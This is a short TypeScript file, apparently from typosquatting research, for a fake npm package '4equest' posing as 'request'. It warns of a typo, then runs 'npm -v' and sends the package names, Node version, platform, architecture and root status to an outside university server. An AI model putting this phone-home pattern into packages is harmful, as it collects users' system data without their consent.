// 应用ArkTS约束：
// 1. 使用let/const代替var（规则9）
// 2. 添加类型注解（规则1,10）
// 3. 使用箭头函数代替函数表达式（规则26,47）
// 4. 使用类代替动态对象（规则5,24）
// 5. 显式类型标注（规则23）
// 6. 使用Map代替动态对象属性（规则5,21）
// 7. 使用for循环代替for...in（规则41）
// 8. 使用模块导入代替require（规则60,80）

import http from 'http';
import urlParser from 'url';
import { exec } from 'child_process';

let debug: boolean = false;

class HttpService {
    static getRequest(url: string): void {
        if (debug) {
            console.log(url);
        }

        http.get(url, (res) => {
            if (debug) {
                console.log("Got response: " + res.statusCode);
            }
            process.exit(0);
        }).on('error', (e: Error) => {
            if (debug) {
                console.log("Got error: " + e.message);
            }
            process.exit(0);
        }).end();
    }
}

class HomeNotifier {
    static notifyHome(url: string, packageName: string, intendedPackageName: string): void {
        console.log("Warning! Maybe you made a typo in your installation command?!");
        console.log(`Did you want to install '${intendedPackageName}' instead of '${packageName}'?`);

        let isAdmin: boolean = false;
        if (process.getuid) {
            isAdmin = process.getuid() === 0;
        }

        exec('npm -v', (error: Error | null, stdout: string, stderr: string) => {
            if (error !== null) {
                stdout = '';
            }

            const params = new Map<string, string>();
            params.set('p1', packageName);
            params.set('p2', intendedPackageName);
            params.set('p3', 'npm');
            params.set('p4', `${process.version} ${process.platform} ${process.arch}`);
            params.set('p5', isAdmin.toString());
            params.set('p6', stdout);

            let queryPart = '';
            params.forEach((value, key) => {
                queryPart += `${key}=${encodeURIComponent(value)}&`;
            });

            HttpService.getRequest(url + queryPart);
        });
    }
}

if (debug) {
    HomeNotifier.notifyHome(
        "http://localhost:8000/app/?",
        "4equest",
        "request"
    );
} else {
    HomeNotifier.notifyHome(
        "http://svs-repo.informatik.uni-hamburg.de/app/?",
        "4equest",
        "request"
    );
}
